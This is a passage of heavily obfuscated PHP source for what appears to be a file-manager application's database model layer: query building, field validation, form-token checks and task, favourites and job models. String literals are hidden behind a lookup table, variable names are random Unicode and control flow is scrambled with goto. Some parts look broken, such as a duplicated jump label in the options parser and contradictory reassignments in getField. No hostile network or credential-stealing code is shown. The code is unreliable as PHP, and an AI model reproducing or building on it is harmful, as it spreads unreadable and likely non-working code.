public function optionsValue($Eٴې = null) { if (is_null($Eٴې)) { return $this->options; } elseif (is_array($Eٴې)) { $this->options = array_merge($this->options, $Eٴې); } } protected function _parseOptions($dѣ = array()) { goto B; B: $Bȩ׋ =& $_SERVER[놫Ӱ]; if (is_array($dѣ)) { $dѣ = array_merge($this->options, $dѣ); } $this->options = array(); goto D; D: if (!isset($dѣ[$Bȩ׋[264]])) { $dѣ[$Bȩ׋[264]] = $this->getTableName(); $bʌ = $this->fields; } else { $bʌ = $this->getDbFields(); } if (!empty($dѣ[$Bȩ׋[265]])) { $dѣ[$Bȩ׋[264]] .= $Bȩ׋[50] . $dѣ[$Bȩ׋[265]]; } $dѣ[$Bȩ׋[266]] = $this->name; goto B; B: if (isset($dѣ[$Bȩ׋[260]]) && is_array($dѣ[$Bȩ׋[260]]) && !empty($bʌ) && !isset($dѣ[$Bȩ׋[267]]) && !isset($dѣ[$Bȩ׋[264]])) { foreach ($dѣ[$Bȩ׋[260]] as $D劏 => $B) { $D劏 = trim($D劏); if (in_array($D劏, $bʌ, !0)) { if (is_scalar($B)) { $this->_parseType($dѣ[$Bȩ׋[260]], $D劏); } } elseif (!is_numeric($D劏) && $Bȩ׋[71] != substr($D劏, 0, 1) && !1 === strpos($D劏, $Bȩ׋[92]) && !1 === strpos($D劏, $Bȩ׋[245]) && !1 === strpos($D劏, $Bȩ׋[268]) && !1 === strpos($D劏, $Bȩ׋[269])) { unset($dѣ[$Bȩ׋[260]][$D劏]); } } } $this->_options_filter($dѣ); return $dѣ; goto Aĥ¸; Aĥ¸: } protected function _options_filter(&$E򬼩) { } protected function _parseType(&$E΋, $A) { $f =& $_SERVER[놫Ӱ]; if (empty($this->options[$f[270]][$f[4] . $A])) { $cۇ = strtolower($this->fields[$f[237]][$A]); if (!1 !== strpos($cۇ, $f[271])) { } elseif (!1 === strpos($cۇ, $f[272]) && !1 !== strpos($cۇ, $f[273])) { $E΋[$A] = intval($E΋[$A]); } elseif (!1 !== strpos($cۇ, $f[274]) || !1 !== strpos($cۇ, $f[275])) { $E΋[$A] = floatval($E΋[$A]); } elseif (!1 !== strpos($cۇ, $f[276])) { $E΋[$A] = (bool) $E΋[$A]; } } } public function find($a = array()) { goto b; d: $a = $this->_parseOptions(); $Fŵ = $this->db->select($a); if (!1 === $Fŵ) { return !1; } goto Cٕ; A؜: if (!empty($this->options[$e˜َ[278]])) { return $this->returnResult($this->data, $this->options[$e˜َ[278]]); } return $this->data; goto c; b: $e˜َ =& $_SERVER[놫Ӱ]; if (is_numeric($a) || is_string($a)) { $f[$this->getPk()] = $a; $this->options[$e˜َ[260]] = $f; } $this->options[$e˜َ[277]] = 1; goto d; Cٕ: if (empty($Fŵ)) { return null; } $this->data = $Fŵ[0]; $this->_afterFind($this->data, $a); goto A؜; c: } protected function _afterFind(&$f嚛, $A˂) { } protected function returnResult($C꩹, $c = '') { $E܌ =& $_SERVER[놫Ӱ]; if ($c) { if (is_callable($c)) { return call_user_func($c, $C꩹); } switch (strtolower($c)) { case $E܌[279]: return json_encode($C꩹); case $E܌[280]: return xml_encode($C꩹); } } return $C꩹; } public function parseFieldsMap($B, $b쓾䫶 = 1) { if (!empty($this->_map)) { foreach ($this->_map as $c => $B˼) { if ($b쓾䫶 == 1) { if (isset($B[$B˼])) { $B[$c] = $B[$B˼]; unset($B[$B˼]); } } else { if (isset($B[$c])) { $B[$B˼] = $B[$c]; unset($B[$c]); } } } } return $B; } public function setField($A껆, $Eڄ = '') { if (is_array($A껆)) { $B = $A껆; } else { $B[$A껆] = $Eڄ; } return $this->save($B); } public function setAdd($f߂, $FԐ = 1) { $dߙ =& $_SERVER[놫Ӱ]; $D = $f߂ . $dߙ[281] . $FԐ; if ($FԐ < 0) { $D = $f߂ . $FԐ; } return $this->setField($f߂, array($dߙ[282], $D)); } public function getField($B, $E = null) { $eڒ =& $_SERVER[놫Ӱ]; $dיט[$eڒ[258]] = $B; $dיט = $this->_parseOptions($dיט); $B = trim($B); if (strpos($B, $eڒ[47])) { if (!isset($dיט[$eڒ[277]])) { $dיט[$eڒ[277]] = is_numeric($E) ? $E : $eڒ[33]; } $Bɵ = $this->db->select($dיט); if (!empty($Bɵ)) { goto B; B: $E = explode($eڒ[47], $B); $B = array_keys($Bɵ[0]); $E = array_shift($B); goto E㓲; E㓲: $E = array_shift($B); $FȂ« = array(); $fމ߈ = count($E); goto A˺Ĺ; A˺Ĺ: foreach ($Bɵ as $c֏) { $c = $c֏[$E]; if (2 == $fމ߈) { $FȂ«[$c] = $c֏[$E]; } else { $FȂ«[$c] = is_string($E) ? implode($E, $c֏) : $c֏; } } return $FȂ«; goto Bݷ̅; Bݷ̅: } } else { if (!0 !== $E) { $dיט[$eڒ[277]] = is_numeric($E) ? $E : 1; } if ($E === $eڒ[240]) { unset($dיט[$eڒ[277]]); } $c֏ = $this->db->select($dיט); if (!empty($c֏)) { if ($E === $eڒ[240]) { return reset($c֏[0]); } if (!0 !== $E && 1 == $dיט[$eڒ[277]]) { return reset($c֏[0]); } foreach ($c֏ as $Cָ) { $Ā[] = $Cָ[$B]; } return $Ā; } } return null; } public function create($C = '', $Eꠚ = '') { goto fى; B֜: if (isset($bȫ͢)) { if (is_string($bȫ͢)) { $bȫ͢ = explode($Fޱ[47], $bȫ͢); } if (think_config($Fޱ[283])) { $bȫ͢[] = think_config($Fޱ[284]); } foreach ($C as $bڒ => $aژ) { if (!in_array($bڒ, $bȫ͢)) { unset($C[$bڒ]); } } } if (!$this->autoValidation($C, $Eꠚ)) { return !1; } if (!$this->autoCheckToken($C)) { $this->error = think_lang($Fޱ[285]); return !1; } goto DŃ; C܄: return $C; goto dщ; fى: $Fޱ =& $_SERVER[놫Ӱ]; if (empty($C)) { $C = $_POST; } elseif (is_object($C)) { $C = get_object_vars($C); } if (empty($C) || !is_array($C)) { $this->error = think_lang($Fޱ[256]); return !1; } goto AĪ; DŃ: if ($this->autoCheckFields) { $bȫ͢ = $this->getDbFields(); foreach ($C as $bڒ => $aژ) { if (!in_array($bڒ, $bȫ͢)) { unset($C[$bڒ]); } elseif (MAGIC_QUOTES_GPC && is_string($aژ)) { $C[$bڒ] = stripslashes($aژ); } } } $this->autoOperation($C, $Eꠚ); $this->data = $C; goto C܄; AĪ: $C = $this->parseFieldsMap($C, 0); $Eꠚ = $Eꠚ ? $Eꠚ : (!empty($C[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$Fޱ[258]])) { $bȫ͢ = $this->options[$Fޱ[258]]; unset($this->options[$Fޱ[258]]); } elseif ($Eꠚ == THINK_MODEL_INSERT && isset($this->insertFields)) { $bȫ͢ = $this->insertFields; } elseif ($Eꠚ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $bȫ͢ = $this->updateFields; } goto B֜; dщ: } public function autoCheckToken($bż) { $aԗ =& $_SERVER[놫Ӱ]; if (isset($this->options[$aԗ[286]]) && !$this->options[$aԗ[286]]) { return !0; } if (think_config($aԗ[283])) { $e҆ = think_config($aԗ[284]); if (!isset($bż[$e҆]) || Session::get($e҆)) { return !1; } list($A𕅍, $C) = explode($aԗ[71], $bż[$e҆]); if ($C && Session::get($e҆ . $aԗ[92] . $A𕅍) === $C) { Session::remove($e҆ . $aԗ[92] . $A𕅍); return !0; } if (think_config($aԗ[287])) { Session::remove($e҆ . $aԗ[92] . $A𕅍); } return !1; } return !0; } public function regex($c򔚷, $Aț) { $c =& $_SERVER[놫Ӱ]; $D = array($c[288] => $c[289], $c[290] => $c[291], $c[292] => $c[293], $c[294] => $c[295], $c[296] => $c[297], $c[298] => $c[299], $c[300] => $c[301], $c[275] => $c[302], $c[303] => $c[304]); if (isset($D[strtolower($Aț)])) { $Aț = $D[strtolower($Aț)]; } return preg_match($Aț, $c򔚷) === 1; } private function autoOperation(&$d, $Bܾ) { $D =& $_SERVER[놫Ӱ]; if (!empty($this->options[$D[305]])) { $BŪ = $this->options[$D[305]]; unset($this->options[$D[305]]); } elseif (!empty($this->_auto)) { $BŪ = $this->_auto; } if (isset($BŪ)) { foreach ($BŪ as $d) { if (empty($d[2])) { $d[2] = THINK_MODEL_INSERT; } if ($Bܾ == $d[2] || $d[2] == THINK_MODEL_BOTH) { switch (trim($d[3])) { case $D[306]: case $D[307]: $f = isset($d[4]) ? (array) $d[4] : array(); if (isset($d[$d[0]])) { array_unshift($f, $d[$d[0]]); } if ($D[306] == $d[3]) { $d[$d[0]] = call_user_func_array($d[1], $f); } else { $d[$d[0]] = call_user_func_array(array(&$this, $d[1]), $f); } break; case $D[258]: $d[$d[0]] = $d[$d[1]]; break; case $D[308]: if ($D[33] === $d[$d[0]]) { unset($d[$d[0]]); } break; case $D[309]: default: $d[$d[0]] = $d[1]; } if (!1 === $d[$d[0]]) { unset($d[$d[0]]); } } } } return $d; } protected function autoValidation($D, $Dޤݶ) { $b٣ۆ =& $_SERVER[놫Ӱ]; if (!empty($this->options[$b٣ۆ[310]])) { $C· = $this->options[$b٣ۆ[310]]; unset($this->options[$b٣ۆ[310]]); } elseif (!empty($this->_validate)) { $C· = $this->_validate; } if (isset($C·)) { if ($this->patchValidate) { $this->error = array(); } foreach ($C· as $ě => $cټƥ) { if (empty($cټƥ[5]) || $cټƥ[5] == THINK_MODEL_BOTH || $cټƥ[5] == $Dޤݶ) { if (0 == strpos($cټƥ[2], $b٣ۆ[311]) && strpos($cټƥ[2], $b٣ۆ[312])) { $cټƥ[2] = think_lang(substr($cټƥ[2], 2, -1)); } $cټƥ[3] = isset($cټƥ[3]) ? $cټƥ[3] : THINK_EXISTS_VALIDATE; $cټƥ[4] = isset($cټƥ[4]) ? $cټƥ[4] : $b٣ۆ[313]; switch ($cټƥ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($D, $cټƥ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($b٣ۆ[33] != trim($D[$cټƥ[0]])) { if (!1 === $this->_validationField($D, $cټƥ)) { return !1; } } break; default: if (isset($D[$cټƥ[0]])) { if (!1 === $this->_validationField($D, $cټƥ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Cʴ, $dǜ̈) { if (!1 === $this->_validationFieldItem($Cʴ, $dǜ̈)) { if ($this->patchValidate) { $this->error[$dǜ̈[0]] = $dǜ̈[2]; } else { $this->error = $dǜ̈[2]; return !1; } } return; } protected function _validationFieldItem($dӒ, $CǑŪ) { $a䊞 =& $_SERVER[놫Ӱ]; switch (strtolower(trim($CǑŪ[4]))) { case $a䊞[306]: case $a䊞[307]: $D˸ = isset($CǑŪ[6]) ? (array) $CǑŪ[6] : array(); if (is_string($CǑŪ[0]) && strpos($CǑŪ[0], $a䊞[47])) { $CǑŪ[0] = explode($a䊞[47], $CǑŪ[0]); } if (is_array($CǑŪ[0])) { foreach ($CǑŪ[0] as $aϒ) { $a섚[$aϒ] = $dӒ[$aϒ]; } array_unshift($D˸, $a섚); } else { array_unshift($D˸, $dӒ[$CǑŪ[0]]); } if ($a䊞[306] == $CǑŪ[4]) { return call_user_func_array($CǑŪ[1], $D˸); } else { return call_user_func_array(array(&$this, $CǑŪ[1]), $D˸); } case $a䊞[314]: return $dӒ[$CǑŪ[0]] == $dӒ[$CǑŪ[1]]; case $a䊞[315]: if (is_string($CǑŪ[0]) && strpos($CǑŪ[0], $a䊞[47])) { $CǑŪ[0] = explode($a䊞[47], $CǑŪ[0]); } $D涤 = array(); if (is_array($CǑŪ[0])) { foreach ($CǑŪ[0] as $aϒ) { $D涤[$aϒ] = $dӒ[$aϒ]; } } else { $D涤[$CǑŪ[0]] = $dӒ[$CǑŪ[0]]; } if (!empty($dӒ[$this->getPk()])) { $D涤[$this->getPk()] = array($a䊞[316], $dӒ[$this->getPk()]); } if ($this->where($D涤)->find()) { return !1; } return !0; default: return $this->check($dӒ[$CǑŪ[0]], $CǑŪ[1], $CǑŪ[4]); } } public function check($cձ, $Cǅ޴, $C⷟ = "\162\x65\147\145\x78") { $d⟮ג =& $_SERVER[놫Ӱ]; $C⷟ = strtolower(trim($C⷟)); switch ($C⷟) { case $d⟮ג[7]: case $d⟮ג[317]: $bʫ = is_array($Cǅ޴) ? $Cǅ޴ : explode($d⟮ג[47], $Cǅ޴); return $C⷟ == $d⟮ג[7] ? in_array($cձ, $bʫ) : !in_array($cձ, $bʫ); case $d⟮ג[318]: case $d⟮ג[319]: if (is_array($Cǅ޴)) { $Aů = $Cǅ޴[0]; $E׸ = $Cǅ޴[1]; } else { list($Aů, $E׸) = explode($d⟮ג[47], $Cǅ޴); } return $C⷟ == $d⟮ג[318] ? $cձ >= $Aů && $cձ <= $E׸ : $cձ < $Aů || $cձ > $E׸; case $d⟮ג[320]: case $d⟮ג[321]: return $C⷟ == $d⟮ג[320] ? $cձ == $Cǅ޴ : $cձ != $Cǅ޴; case $d⟮ג[322]: $cƣõ = mb_strlen($cձ, $d⟮ג[323]); if (strpos($Cǅ޴, $d⟮ג[47])) { list($Aů, $E׸) = explode($d⟮ג[47], $Cǅ޴); return $cƣõ >= $Aů && $cƣõ <= $E׸; } else { return $cƣõ == $Cǅ޴; } case $d⟮ג[324]: list($fۋ, $CǪ) = explode($d⟮ג[47], $Cǅ޴); if (!is_numeric($fۋ)) { $fۋ = strtotime($fۋ); } if (!is_numeric($CǪ)) { $CǪ = strtotime($CǪ); } return NOW_TIME >= $fۋ && NOW_TIME <= $CǪ; case $d⟮ג[325]: return in_array(get_client_ip(), explode($d⟮ג[47], $Cǅ޴)); case $d⟮ג[326]: return !in_array(get_client_ip(), explode($d⟮ג[47], $Cǅ޴)); case $d⟮ג[313]: default: return $this->regex($cձ, $Cǅ޴); } } public function query($AƢ, $c֪Ѡ = false) { $BҲ =& $_SERVER[놫Ӱ]; if (!is_bool($c֪Ѡ) && !is_array($c֪Ѡ)) { $c֪Ѡ = func_get_args(); array_shift($c֪Ѡ); } $AƢ = str_replace(array($BҲ[214], $BҲ[327]), $BҲ[50], $AƢ); $AƢ = $this->parseSql($AƢ, $c֪Ѡ); return $this->db->query($AƢ); } public function execute($D،, $Dх΃ = false) { if (!is_bool($Dх΃) && !is_array($Dх΃)) { $Dх΃ = func_get_args(); array_shift($Dх΃); } $D، = $this->parseSql($D،, $Dх΃); return $this->db->execute($D،); } protected function parseSql($dȮ, $Cɡ) { $bڷ =& $_SERVER[놫Ӱ]; if (!0 === $Cɡ) { $a = $this->_parseOptions(); $dȮ = $this->db->parseSql($dȮ, $a); } elseif (is_array($Cɡ)) { $Cɡ = array_map(array($this->db, $bڷ[328]), $Cɡ); $dȮ = vsprintf($dȮ, $Cɡ); } else { $dȮ = strtr($dȮ, array($bڷ[329] => $this->getTableName(), $bڷ[330] => think_config($bڷ[229]))); } $this->db->setModel($this->name); return $dȮ; } public function db($cՐ = '', $bʧ = '', $e = array()) { goto B¬Ԗ; Cކĩ: $Fʒߣ[$cՐ] = $bʧ; $this->db = $BƂ[$cՐ]; $this->_after_db(); goto a; a: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto f; Fڈ͑: static $BƂ = array(); if (!isset($BƂ[$cՐ]) || isset($BƂ[$cՐ]) && $bʧ && $Fʒߣ[$cՐ] != $bʧ) { if (!empty($bʧ) && is_string($bʧ) && !1 === strpos($bʧ, $Fତ[8])) { $bʧ = think_config($bʧ); } $BƂ[$cՐ] = Db::getInstance($bʧ); } elseif (NULL === $bʧ) { $BƂ[$cՐ]->close(); unset($BƂ[$cՐ]); return; } if (!empty($e)) { if (is_string($e)) { parse_str($e, $e); } foreach ($e as $a => $f锿咇) { $this->setProperty($a, $f锿咇); } } goto Cކĩ; B¬Ԗ: $Fତ =& $_SERVER[놫Ӱ]; if ($Fତ[33] === $cՐ && $this->db) { return $this->db; } static $Fʒߣ = array(); goto Fڈ͑; f: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $A = get_class($this); if ($A == $_SERVER[놫Ӱ][331]) { return $this->name; } $this->name = substr($A, 0, -5); } return $this->name; } public function getTableName() { $B֭ =& $_SERVER[놫Ӱ]; if (empty($this->trueTableName)) { $Bۃ = !empty($this->tablePrefix) ? $this->tablePrefix : $B֭[33]; if (!empty($this->tableName)) { $Bۃ .= $this->tableName; } else { $Bۃ .= think_parse_name($this->name); } $this->trueTableName = strtolower($Bۃ); } return (!empty($this->dbName) ? $this->dbName . $B֭[92] : $B֭[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $B =& $_SERVER[놫Ӱ]; return isset($this->fields[$B[236]]) ? $this->fields[$B[236]] : $this->pk; } public function getDbFields() { $eΓܭ =& $_SERVER[놫Ӱ]; if (isset($this->options[$eΓܭ[264]])) { $B̓ = $this->db->getFields($this->options[$eΓܭ[264]]); return $B̓ ? array_keys($B̓) : !1; } if ($this->fields) { $B̓ = $this->fields; unset($B̓[$eΓܭ[235]], $B̓[$eΓܭ[236]], $B̓[$eΓܭ[237]], $B̓[$eΓܭ[234]]); return $B̓; } return !1; } public function data($BӬ = '') { $Dև =& $_SERVER[놫Ӱ]; if ($Dև[33] === $BӬ && !empty($this->data)) { return $this->data; } if (is_object($BӬ)) { $BӬ = get_object_vars($BӬ); } elseif (is_string($BӬ)) { parse_str($BӬ, $BӬ); } elseif (!is_array($BӬ)) { think_exception(think_lang($Dև[256])); } $this->data = $BӬ; return $this; } public function join($D棑) { $eƺ =& $_SERVER[놫Ӱ]; if (is_array($D棑)) { $this->options[$eƺ[267]] = $D棑; } elseif (!empty($D棑)) { $this->options[$eƺ[267]][] = $D棑; } return $this; } public function union($A, $Dǃ̅ = false) { goto Aѽ; cᶤ: if (is_object($A)) { $A = get_object_vars($A); } if (is_string($A)) { $E񌧨 = $A; } elseif (is_array($A)) { if (isset($A[0])) { $this->options[$cƎ[332]] = array_merge($this->options[$cƎ[332]], $A); return $this; } else { $E񌧨 = $A; } } else { think_exception(think_lang($cƎ[256])); } $this->options[$cƎ[332]][] = $E񌧨; goto Dڢ; Aѽ: $cƎ =& $_SERVER[놫Ӱ]; if (empty($A)) { return $this; } if ($Dǃ̅) { $this->options[$cƎ[332]][$cƎ[333]] = !0; } goto cᶤ; Dڢ: return $this; goto FϺآϭ; FϺآϭ: } public function cache($C = true, $b栋 = null, $F˕ = '') { $eЇ =& $_SERVER[놫Ӱ]; if (!1 !== $C) { $this->options[$eЇ[334]] = array($eЇ[88] => $C, $eЇ[324] => $b栋, $eЇ[29] => $F˕); } return $this; } public function field($bެ, $Fڈ̗ = false) { $bц =& $_SERVER[놫Ӱ]; if (!0 === $bެ) { $Aɖ؛ = $this->getDbFields(); $bެ = $Aɖ؛ ? $Aɖ؛ : $bц[173]; } elseif ($Fڈ̗) { if (is_string($bެ)) { $bެ = explode($bц[47], $bެ); } $Aɖ؛ = $this->getDbFields(); $bެ = $Aɖ؛ ? array_diff($Aɖ؛, $bެ) : $bެ; } $this->options[$bц[258]] = $bެ; return $this; } public function scope($e㓘 = '', $e = NULL) { $Fލڏ =& $_SERVER[놫Ӱ]; if ($Fލڏ[33] === $e㓘) { if (isset($this->_scope[$Fލڏ[34]])) { $dڕ = $this->_scope[$Fލڏ[34]]; } else { return $this; } } elseif (is_string($e㓘)) { $BҰ = explode($Fލڏ[47], $e㓘); $dڕ = array(); foreach ($BҰ as $eފ) { if (!isset($this->_scope[$eފ])) { continue; } $dڕ = array_merge($dڕ, $this->_scope[$eފ]); } if (!empty($e) && is_array($e)) { $dڕ = array_merge($dڕ, $e); } } elseif (is_array($e㓘)) { $dڕ = $e㓘; } if (is_array($dڕ) && !empty($dڕ)) { $this->options = array_merge($this->options, array_change_key_case($dڕ)); } return $this; } public function where($a񂌺, $B݊ = null) { $b =& $_SERVER[놫Ӱ]; if (!is_null($B݊) && is_string($a񂌺)) { if (!is_array($B݊)) { $B݊ = func_get_args(); array_shift($B݊); } $B݊ = array_map(array($this->db, $b[328]), $B݊); $a񂌺 = vsprintf($a񂌺, $B݊); } elseif (is_object($a񂌺)) { $a񂌺 = get_object_vars($a񂌺); } if (is_string($a񂌺) && $b[33] != $a񂌺) { $Bٞ = array(); $Bٞ[$b[335]] = $a񂌺; $a񂌺 = $Bٞ; } if (isset($this->options[$b[260]])) { $this->options[$b[260]] = array_merge($this->options[$b[260]], $a񂌺); } else { $this->options[$b[260]] = $a񂌺; } return $this; } public function limit($b, $d = null) { $Eն =& $_SERVER[놫Ӱ]; $this->options[$Eն[277]] = is_null($d) ? $b : $b . $Eն[47] . $d; return $this; } public function page($Fݿ؄, $f˙Ԉ = null) { $eŴ =& $_SERVER[놫Ӱ]; $this->options[$eŴ[336]] = is_null($f˙Ԉ) ? $Fݿ؄ : $Fݿ؄ . $eŴ[47] . $f˙Ԉ; return $this; } public function comment($e׃癣) { $this->options[$_SERVER[놫Ӱ][337]] = $e׃癣; return $this; } public function setProperty($Eѐǉ, $E) { if (property_exists($this, $Eѐǉ)) { $this->{$Eѐǉ} = $E; } return $this; } } goto c; bψ϶: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\155\x2e\164\141\163\153\114\x69\163\164"; public $field = array("\156\141\155\x65", "\164\x79\160\145", "\x65\x76\x65\x6e\x74", "\164\151\x6d\x65", "\x64\x65\x73\x63", "\x73\x79\163\164\x65\155", "\x65\156\141\x62\x6c\145", "\x6c\x61\163\164\122\165\156", "\163\157\162\164"); public function listData($cƗǩ = false, $A = "\163\157\x72\x74", $aι = false) { return parent::listData($cƗǩ, $A, $aι); } public function add($aφѝ) { $D =& $_SERVER[놫Ӱ]; $E㊰Մ = $this->findByName($aφѝ[$D[28]]); if ($E㊰Մ) { return !1; } $aφѝ[$D[1305]] = 0; $aφѝ[$D[2023]] = $this->getSort(); return parent::insert($aφѝ); } private function getSort() { $Fȋ =& $_SERVER[놫Ӱ]; $bش = parent::listData(); $Bÿ = array_to_keyvalue($bش, $Fȋ[33], $Fȋ[2023]); return empty($Bÿ) ? 0 : max($Bÿ) + 1; } public function update($BЪ, $Aأ돫) { $Dִ =& $_SERVER[놫Ӱ]; $d㥃ǚ = $this->listData($BЪ); $F͇ = $this->findByName($Aأ돫[$Dִ[28]]); if (!$d㥃ǚ || $F͇ && $F͇[$Dִ[364]] != $d㥃ǚ[$Dִ[364]]) { return !1; } return parent::update($BЪ, $Aأ돫); } public function remove($c) { $fԓ = $this->listData($c); if (!$fԓ || $fԓ[$_SERVER[놫Ӱ][1047]]) { return !1; } return parent::remove($c); } public function enable($C) { $E =& $_SERVER[놫Ӱ]; $Dıͅ = $this->listData($C); $Aʒ = !$Dıͅ[$E[1312]]; return $this->update($C, array($E[2353] => $Aʒ)); } public function run($e) { return $this->update($e, array($_SERVER[놫Ӱ][2354] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\145\x72\x5f\146\141\166"; protected function cacheFunctionAlias($Fō) { $a =& $_SERVER[놫Ӱ]; return array($a[2355] => array(USER_ID, $a[2356])); } protected function listData() { $eۑ =& $_SERVER[놫Ӱ]; $EŒ = array($eۑ[1330] => USER_ID, $eۑ[432] => 0); $a = $eۑ[2357]; $FǨ = $this->field($a)->where($EŒ)->order($eۑ[2358])->select(); return $FǨ ? $FǨ : array(); } protected function resetCache() { } protected function listView() { goto F; aʭ: $bՆ = array_to_keyvalue($bՆ, $bɆ[366]); foreach ($Bʲ as $F뎦 => $a񬋛) { $A۱ = $bՆ[$a񬋛[$bɆ[76]]]; $A۱ = $A۱ ? $A۱ : array(); $Bʲ[$F뎦] = array_merge($A۱, $a񬋛); } return $Bʲ; goto c߆; D˸ȲƖ: $A̙ = array($bɆ[380] => array($bɆ[381], $BŃ)); $bՆ = Model($bɆ[747])->listSource($A̙, $aʈ); $bՆ = array_merge($bՆ[$bɆ[74]], $bՆ[$bɆ[75]]); goto aʭ; a䔐Ҝ: $BŃ = array_to_keyvalue($E䖂, $bɆ[33], $bɆ[76]); if (!$BŃ) { return $Bʲ; } $aʈ = 2000; goto D˸ȲƖ; F: $bɆ =& $_SERVER[놫Ӱ]; $Bʲ = $this->listData(); $E䖂 = array_filter_by_field($Bʲ, $bɆ[29], $bɆ[379]); goto a䔐Ҝ; c߆: } protected function addFav($FނꟉ, $bïƾ = '', $F鱚Ӎ = "\x73\157\165\x72\143\x65") { goto Dŝ; eڣ: return $this->add($Aζ⍸); goto cԏ; Dŝ: $D =& $_SERVER[놫Ӱ]; $eç = array($D[1330] => USER_ID, $D[432] => 0, $D[385] => $F鱚Ӎ, $D[384] => $FނꟉ); if ($this->where($eç)->find()) { return !1; } goto DЍ; DЍ: $eç = array($D[1330] => USER_ID, $D[432] => 0); $Bʝ򲫧 = $this->where($eç)->max($D[2023]); if (!$Bʝ򲫧) { $Bʝ򲫧 = 0; } goto F轛; F轛: if (!$bïƾ && $F鱚Ӎ == $D[379]) { $b = Model($D[1075])->where(array($D[380] => $FނꟉ))->find(); if (!$b) { return !1; } $bïƾ = $b[$D[28]]; } $bïƾ = $this->getAutoName($bïƾ); $Aζ⍸ = array($D[1330] => USER_ID, $D[432] => 0, $D[383] => $bïƾ, $D[384] => $FނꟉ, $D[385] => $F鱚Ӎ, $D[2006] => $Bʝ򲫧 + 1); goto eڣ; cԏ: } protected function remove($dֻ) { $b =& $_SERVER[놫Ӱ]; $D = array($b[1330] => USER_ID, $b[382] => $dֻ); return $this->where($D)->delete(); } protected function removeByName($Cڣ) { $Cڬ =& $_SERVER[놫Ӱ]; $f£ = array($Cڬ[1330] => USER_ID, $Cڬ[383] => $Cڣ, $Cڬ[432] => 0); return $this->where($f£)->delete(); } protected function rename($F≷, $eƟ) { $BЈ̽ =& $_SERVER[놫Ӱ]; if ($F≷ == $eƟ) { return !1; } $F = $this->getAutoName($eƟ); if ($eƟ != $F) { return !1; } $dѨ = array($BЈ̽[1330] => USER_ID, $BЈ̽[432] => 0, $BЈ̽[28] => $F≷); return $this->where($dѨ)->save(array($BЈ̽[28] => $eƟ)); } protected function resetSort($Cũ) { $f =& $_SERVER[놫Ӱ]; $Dڈ = array($f[1330] => USER_ID); for ($b = 0; $b < count($Cũ); $b++) { $Dڈ[$f[382]] = $Cũ[$b]; $this->where($Dڈ)->save(array($f[2006] => $b + 1)); } return !0; } protected function moveTop($FÆ) { goto Dђ; a֠: if (!$B력) { return; } $Aގ = $this->field($cх[364])->where($e̳͊)->order($cх[2358])->select(); $Aގ = array_to_keyvalue($Aގ, $cх[33], $cх[364]); goto Eۓ; Dђ: $cх =& $_SERVER[놫Ӱ]; $e̳͊ = array($cх[1330] => USER_ID, $cх[432] => 0); $B력 = $this->where($e̳͊)->where(array($cх[28] => $FÆ))->find(); goto a֠; Cחݦ: return $this->resetSort($Aގ); goto A͌; Eۓ: $e = $Aގ; $Aގ = array_remove_value($Aގ, $B력[$cх[364]]); array_unshift($Aގ, $B력[$cх[364]]); goto Cחݦ; A͌: } protected function moveBottom($c) { $aڒ =& $_SERVER[놫Ӱ]; $cڪ = array($aڒ[1330] => USER_ID, $aڒ[432] => 0); $fŚߘ = $this->where($cڪ)->max($aڒ[2023]); $aѳ = array($aڒ[2023] => $fŚߘ + 1); return $this->where($cڪ)->where(array($aڒ[28] => $c))->save($aѳ); } private function getAutoName($a) { goto c܅; A󚍎: $Dˇ = array_to_keyvalue($Dˇ, $CȠʰ[33], $CȠʰ[28]); if (!$Dˇ || !in_array($a, $Dˇ)) { return $a; } for ($b = 0; $b < count($Dˇ); $b++) { if (!in_array($a . "\50{$b}\51", $Dˇ)) { return $a . "\50{$b}\x29"; } } goto Dݲ; Dݲ: return $a . "\x28{$b}\x29"; goto F; c܅: $CȠʰ =& $_SERVER[놫Ӱ]; $d = array($CȠʰ[1330] => USER_ID, $CȠʰ[432] => 0); $Dˇ = $this->field($CȠʰ[28])->where($d)->select(); goto A󚍎; F: } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\x2e\x6a\x6f\142\114\151\163\164"; public $field = array("\x6e\141\x6d\145", "\144\145\163\143", "\163\x6f\162\164"); const JOB_KEY = "\x73\x65\154\146\x4a\157\x62\114\x69\x73\x74"; public function listData($C = false, $Dﵝù = "\163\157\162\x74", $Bǘ = false) { return parent::listData($C, $Dﵝù, $Bǘ); } public function remove($A) { return parent::remove($A); } public function add($c֥ͼ) { $c䊊 =& $_SERVER[놫Ӱ]; if ($this->findByName($c֥ͼ[$c䊊[28]])) { return !1; } $c֥ͼ[$c䊊[2023]] = $this->getSort(); return parent::insert($c֥ͼ); } private function getSort() { $f̥ =& $_SERVER[놫Ӱ]; $Aស = parent::listData(); $B = array_to_keyvalue($Aស, $f̥[33], $f̥[2023]); return empty($B) ? 0 : max($B) + 1; } public function update($Aű, $Fݲ) { $d˞ =& $_SERVER[놫Ӱ]; $E͑ = parent::listData($Aű); $C = $this->findByName($Fݲ[$d˞[28]]); if (!$E͑ || $C && $C[$d˞[364]] != $E͑[$d˞[364]]) { return !1; } return parent::update($Aű, $Fݲ); } public function setUserJob($Döϋ, $dĕŐ) { goto a͏; cƺ: $A̺ = array_to_keyvalue($eֿ, $C[28]); $fڤ = $C[358]; foreach ($dĕŐ as $b) { if ($A̺[$b]) { $fڤ .= $A̺[$b][$C[364]] . $C[47]; } else { $BϷ = $this->add($b); $fڤ .= $BϷ . $C[47]; } } goto a; a͏: $C =& $_SERVER[놫Ӱ]; if (!is_array($dĕŐ)) { $dĕŐ = array($dĕŐ); } $eֿ = parent::listData(); goto cƺ; a: 